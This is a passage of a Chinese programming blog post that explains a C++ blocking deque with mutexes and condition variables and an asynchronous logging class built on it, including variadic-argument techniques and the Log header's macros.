class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BLOCKQUEUE_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLOCKQUEUE_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span>              <span class="comment">//互斥量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span>              <span class="comment">//双端队列</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;condition_variable&gt;</span> <span class="comment">//条件变量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">//template class&lt;T&gt;          //写错了，找了半天代码补全的问题</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BlockDeque</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">BlockDeque</span><span class="params">(<span class="type">size_t</span> MaxCapacity = <span class="number">1000</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">BlockDeque</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">full</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Close</span><span class="params">()</span></span>;       </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">ssize_t</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">ssize_t</span> <span class="title">capacity</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">T <span class="title">front</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">T <span class="title">back</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push_back</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push_front</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">pop</span><span class="params">(T &amp;item)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">pop</span><span class="params">(T &amp;item, <span class="type">int</span> timeout)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">flush</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::deque&lt;T&gt; deq_;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> capacity_;</span><br><span class="line"></span><br><span class="line">    std::mutex mtx_;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> isClose_;</span><br><span class="line"></span><br><span class="line">    std::condition_variable condConsumer_;</span><br><span class="line"></span><br><span class="line">    std::condition_variable condProducer_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">BlockDeque&lt;T&gt;::<span class="built_in">BlockDeque</span>(<span class="type">size_t</span> MaxCapacity)</span><br><span class="line">:<span class="built_in">capacity_</span>(MaxCapacity)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">assert</span>(MaxCapacity &gt; <span class="number">0</span>);</span><br><span class="line">    isClose_ = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">BlockDeque&lt;T&gt;::~<span class="built_in">BlockDeque</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">Close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> BlockDeque&lt;T&gt;::<span class="built_in">clear</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    deq_.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">bool</span>  BlockDeque&lt;T&gt;::<span class="built_in">empty</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> deq_.<span class="built_in">empty</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">bool</span> BlockDeque&lt;T&gt;::<span class="built_in">full</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="comment">// if(deq_.size()==capacity_)</span></span><br><span class="line">    <span class="comment">//     return true;</span></span><br><span class="line">    <span class="comment">// return false;</span></span><br><span class="line">    <span class="keyword">return</span> deq_.<span class="built_in">size</span>() &gt;= capacity_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> BlockDeque&lt;T&gt;::<span class="built_in">Close</span>()</span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">        deq_.<span class="built_in">clear</span>();</span><br><span class="line">        isClose_ = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    condProducer_.<span class="built_in">notify_all</span>();</span><br><span class="line">    condConsumer_.<span class="built_in">notify_all</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">ssize_t</span> BlockDeque&lt;T&gt;::<span class="built_in">size</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> deq_.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">ssize_t</span> BlockDeque&lt;T&gt;::<span class="built_in">capacity</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> capacity_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T BlockDeque&lt;T&gt;::<span class="built_in">front</span>()</span><br><span class="line">&#123;  </span><br><span class="line">     <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">     <span class="keyword">return</span> deq_.<span class="built_in">front</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T BlockDeque&lt;T&gt;::<span class="built_in">back</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> deq_.<span class="built_in">back</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> BlockDeque&lt;T&gt;::<span class="built_in">push_back</span>(<span class="type">const</span> T &amp;item)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//考虑容量问题</span></span><br><span class="line">    <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="keyword">while</span>(deq_.<span class="built_in">size</span>() &gt;= capacity_)</span><br><span class="line">    &#123;</span><br><span class="line">        condProducer_.<span class="built_in">wait</span>(locker);</span><br><span class="line">    &#125;</span><br><span class="line">    deq_.<span class="built_in">push_back</span>(item);</span><br><span class="line">    condConsumer_.<span class="built_in">notify_one</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> BlockDeque&lt;T&gt;::<span class="built_in">push_front</span>(<span class="type">const</span> T &amp;item)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="keyword">while</span>(deq_.<span class="built_in">size</span>() &gt;= capacity_)</span><br><span class="line">    &#123;</span><br><span class="line">        condProducer_.<span class="built_in">wait</span>(locker);</span><br><span class="line">    &#125;</span><br><span class="line">    deq_.<span class="built_in">push_front</span>(item);</span><br><span class="line">    condConsumer_.<span class="built_in">notify_one</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">bool</span> BlockDeque&lt;T&gt;::<span class="built_in">pop</span>(T &amp;item)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="keyword">while</span>(deq_.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        condConsumer_.<span class="built_in">wait</span>(locker);</span><br><span class="line">        <span class="keyword">if</span>(isClose_)      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    item = deq_.<span class="built_in">front</span>();        <span class="comment">//注意先取队列再弹出；</span></span><br><span class="line">    deq_.<span class="built_in">pop_front</span>();</span><br><span class="line">    condProducer_.<span class="built_in">notify_one</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">bool</span> BlockDeque&lt;T&gt;::<span class="built_in">pop</span>(T &amp;item, <span class="type">int</span> timeout)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="keyword">while</span>(deq_.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(condConsumer_.<span class="built_in">wait_for</span>(locker,std::chrono::<span class="built_in">seconds</span>(timeout))</span><br><span class="line">            ==  std::cv_status::timeout)           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(isClose_)       <span class="keyword">return</span> <span class="literal">false</span>;       </span><br><span class="line">    &#125;</span><br><span class="line">    item = deq_.<span class="built_in">front</span>();        <span class="comment">//注意先取队列再弹出；</span></span><br><span class="line">    deq_.<span class="built_in">pop_front</span>();</span><br><span class="line">    condProducer_.<span class="built_in">notify_one</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> BlockDeque&lt;T&gt;::<span class="built_in">flush</span>()</span><br><span class="line">&#123;</span><br><span class="line">  condConsumer_.<span class="built_in">notify_one</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="LoG"><a href="#LoG" class="headerlink" title="LoG"></a>LoG</h3><ul><li><p>这里我们使用阻塞队列，由于日志通常是异步执行，且日志操作由于涉及IO操作往往较慢。当日志产生速度远远大于日志写入速度时，阻塞队列可以作为一个缓冲区，暂时存储大量的日志消息。</p></li><li><p>由于有时候我们需要自定义格式化字符串，传入的参数不定，那么，我们就需要在如cpp实现可变参数：</p><ul><li>cpp方法(C++11)，使用可变参数模板。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">const</span> Args&amp;... args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (std::cout &lt;&lt; ...  &lt;&lt; args) &lt;&lt; std::endl;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>c语言方法，使用<code>宏</code>和<code>va_list</code>机制来实现可变参数。Log同时使用了c语言的这两种方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过宏实现</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACRO_LOG(format, ...) printf(<span class="string">&quot;[MACRO_LOG]  &quot;</span>);  printf(format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过va_list实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">valist_log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format,...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">va_start</span>(args, format);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[valist_log]   &quot;</span>);</span><br><span class="line">    <span class="built_in">vprintf</span>(format,args);</span><br><span class="line">    <span class="built_in">va_end</span>(args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="type">double</span> y = <span class="number">3.14</span>;</span><br><span class="line">    <span class="type">char</span> *str = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MACRO_LOG</span>(<span class="string">&quot;x = %d, y = %.2f, str = %s\n&quot;</span>, x, y, str);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">valist_log</span>(<span class="string">&quot;x = %d, y = %.2f, str = %s\n&quot;</span>, x, y, str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>为什么pop要检查close变量而push不用？<br>当调用close时，会清空队列。push进的元素马上就被消费者吃掉。而pop会因为队列无元素而产生异常。</p></li><li><p><code>snprintf</code>和<code>vsnprintf</code>：</p><ul><li>使用 <code>snprintf</code> 时，你需要提前定义好格式化字符串，并将其作为固定参数传递给 <code>snprintf</code>。</li><li>使用 <code>vsnprintf</code> 时，你可以直接在调用时传递格式化字符串和可变参数列表，不需要提前定义格式化字符串。</li></ul></li></ul><h4 id="LOG-H"><a href="#LOG-H" class="headerlink" title="LOG_H"></a>LOG_H</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LOG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/types/FILE.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span> <span class="comment">//提供了C标准库中的宏va_start, va_end等，用于处理可变参数函数。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>       <span class="comment">//linux文件系统头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../buffer/buffer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./blockqueue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Log</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> level = <span class="number">1</span>, <span class="type">const</span> <span class="type">char</span>* path = <span class="string">&quot;./log&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="type">const</span> <span class="type">char</span>* suffix = <span class="string">&quot;.log&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="type">int</span> maxQueueCapacity = <span class="number">1024</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">static</span> Log* <span class="title">Instance</span><span class="params">()</span></span>;     <span class="comment">//单例模式</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">FlushLogThread</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">write</span><span class="params">(<span class="type">int</span> level, <span class="type">const</span> <span class="type">char</span> *format, ...)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">flush</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetLevel</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">SetLevel</span><span class="params">(<span class="type">int</span> level)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">IsOpen</span><span class="params">()</span>   </span>&#123;   <span class="keyword">return</span> isOpen_; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Log</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">AppendLogLevelTitle_</span><span class="params">(<span class="type">int</span> level)</span></span>;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Log</span>();     <span class="comment">//TODO</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">AsyncWrite_</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> LOG_PATH_LEN = <span class="number">256</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> LOG_NAME_LEN = <span class="number">256</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> MAX_LINES = <span class="number">50000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* path_;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* suffix_;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> MAX_LINES_;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> lineCount_;</span><br><span class="line">    <span class="type">int</span> toDay_;</span><br><span class="line">    </span><br><span class="line">    <span class="type">bool</span> isOpen_;</span><br><span class="line"></span><br><span class="line">    Buffer buff_;</span><br><span class="line">    <span class="type">int</span> level_;</span><br><span class="line">    <span class="type">bool</span> isAsync_;</span><br><span class="line"></span><br><span class="line">    FILE* fp_;</span><br><span class="line">    std::unique_ptr&lt;BlockDeque&lt;std::string&gt;&gt; deque_;</span><br><span class="line">    std::unique_ptr&lt;std::thread&gt; writeThread_;</span><br><span class="line">    std::mutex mtx_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_BASE(level, format, ...) \</span></span><br><span class="line"><span class="meta">    do &#123;\</span></span><br><span class="line"><span class="meta">        Log* log = Log::Instance();\</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (log-&gt;IsOpen() &amp;&amp; log-&gt;GetLevel() &lt;= level) &#123;\</span></span><br><span class="line"><span class="meta">            log-&gt;write(level, format, ##__VA_ARGS__); \</span></span><br><span class="line"><span class="meta">            log-&gt;flush();\</span></span><br><span class="line"><span class="meta">        &#125;\</span></span><br><span class="line"><span class="meta">    &#125; while(0);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//TODO</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_DEBUG(format, ...) do &#123;LOG_BASE(0, format, ##__VA_ARGS__)&#125; while(0);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_INFO(format, ...) do &#123;LOG_BASE(1, format, ##__VA_ARGS__)&#125; while(0);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_WARN(format, ...) do &#123;LOG_BASE(2, format, ##__VA_ARGS__)&#125; while(0);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_ERROR(format, ...) do &#123;LOG_BASE(3, format, ##__VA_ARGS__)&#125; while(0);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h4 id="LOG-CPP"><a href="#LOG-CPP" 